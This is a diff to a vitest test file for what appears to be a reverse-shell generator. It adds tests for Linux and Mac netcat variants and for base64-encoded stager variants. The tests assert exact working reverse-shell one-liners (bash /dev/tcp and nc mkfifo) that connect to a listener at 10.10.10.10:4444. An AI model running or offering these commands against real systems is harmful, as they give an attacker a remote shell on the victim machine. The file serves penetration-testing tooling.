@@ -1,25 +1,39 @@
 import { describe, expect, it } from "vitest";
+import { base64ToBytes, decodeBytesWithCharset } from "../encoding/bytes";
 import { ShellParams } from "./params";
 import { SHELLS, SHELLS_BY_ID } from "./shells";
 
 const PARAMS: ShellParams = { ip: "10.10.10.10", port: 4444, shellPath: "/bin/bash" };
 
 describe("SHELLS catalog", () => {
-  it("every variant renders a non-empty one-liner containing the IP and port", () => {
+  it("every variant renders a non-empty one-liner containing the IP and port (unless flagged opaque, e.g. base64 stagers)", () => {
     for (const shell of SHELLS) {
       const rendered = shell.render(PARAMS);
       expect(rendered.length).toBeGreaterThan(0);
-      expect(rendered).toContain(PARAMS.ip);
-      expect(rendered).toContain(String(PARAMS.port));
+      const opaque = shell.opaqueParams ?? [];
+      if (!opaque.includes("ip")) expect(rendered).toContain(PARAMS.ip);
+      if (!opaque.includes("port")) expect(rendered).toContain(String(PARAMS.port));
     }
   });
 
-  it("every renderEncoded variant produces a different string than render but still targets the port", () => {
+  it("every renderEncoded variant produces a different string than render", () => {
     for (const shell of SHELLS) {
       if (!shell.renderEncoded) continue;
       const encoded = shell.renderEncoded(PARAMS);
       expect(encoded.length).toBeGreaterThan(0);
       expect(encoded).not.toBe(shell.render(PARAMS));
+    }
+  });
+
+  it("every renderEncoded variant's base64 blob decodes (UTF-16LE) to exactly the script embedded in its plain render() form, and still targets the port", () => {
+    for (const shell of SHELLS) {
+      if (!shell.renderEncoded) continue;
+      const encoded = shell.renderEncoded(PARAMS);
+      const blob = encoded.trim().split(/\s+/).pop()!;
+      const decoded = decodeBytesWithCharset(base64ToBytes(blob), "utf-16le");
+      expect(shell.render(PARAMS)).toContain(decoded);
+      expect(decoded).toContain(PARAMS.ip);
+      expect(decoded).toContain(String(PARAMS.port));
     }
   });
 
@@ -49,9 +63,15 @@ describe("SHELLS catalog", () => {
     expect(SHELLS_BY_ID["bash-dev-tcp"].render(PARAMS)).toBe("/bin/bash -i >& /dev/tcp/10.10.10.10/4444 0>&1");
   });
 
-  it("renders the exact verified nc mkfifo one-liner", () => {
-    expect(SHELLS_BY_ID["nc-mkfifo"].render(PARAMS)).toBe(
+  it("renders the exact verified nc mkfifo one-liner (Linux)", () => {
+    expect(SHELLS_BY_ID["nc-mkfifo-linux"].render(PARAMS)).toBe(
       "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.10.10 4444 >/tmp/f",
+    );
+  });
+
+  it("renders the exact verified nc mkfifo one-liner (Mac, BSD nc ordering)", () => {
+    expect(SHELLS_BY_ID["nc-mkfifo-mac"].render(PARAMS)).toBe(
+      "mkfifo /tmp/f;/bin/bash -i < /tmp/f 2>&1|nc 10.10.10.10 4444 > /tmp/f;rm /tmp/f",
     );
   });
 
